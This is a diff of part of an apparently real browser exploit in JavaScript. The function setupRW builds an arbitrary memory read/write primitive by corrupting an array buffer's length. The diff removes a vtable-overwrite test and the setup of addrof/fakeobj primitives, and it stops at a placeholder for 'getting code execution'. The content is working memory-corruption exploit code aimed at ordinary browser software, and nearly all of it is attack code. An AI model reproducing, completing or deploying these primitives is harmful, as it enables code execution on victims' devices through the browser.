@@ -92,12 +92,7 @@ function setupRW() {
 	g_relative_rw[g_ab_index + OFFSET_JSAB_VIEW_LENGTH + 3] = 0xff;
 
 	debug_log("[+] Testing arbitrary R/W");
-
-	let saved_vtable = read64(guess_htmltextarea_addr);
-	write64(guess_htmltextarea_addr, new Int64("0x4141414141414141"));
-	if (!read64(guess_htmltextarea_addr).equals("0x4141414141414141"))
-		die("[!] Failed to setup arbitrary R/W primitive");
-
+	
 	debug_log("[+] Succesfully got arbitrary R/W!");
 
 	/* Restore the overidden vtable pointer */
@@ -105,16 +100,6 @@ function setupRW() {
 
 	/* Cleanup memory */
 	cleanup();
-
-	/* Set up addrof/fakeobj primitives */
-	g_ab_slave.leakme = 0x1337;
-	var bf = 0;
-	for(var i = 15; i >= 8; i--)
-		bf = 256 * bf + g_relative_rw[g_ab_index + i];
-	g_jsview_butterfly = new Int64(bf);
-	if(!read64(g_jsview_butterfly.sub(16)).equals(new Int64("0xffff000000001337")))
-		die("[!] Failed to setup addrof/fakeobj primitives");
-	debug_log("[+] Succesfully got addrof/fakeobj");
 
 	/* Getting code execution */
 	/* ... */
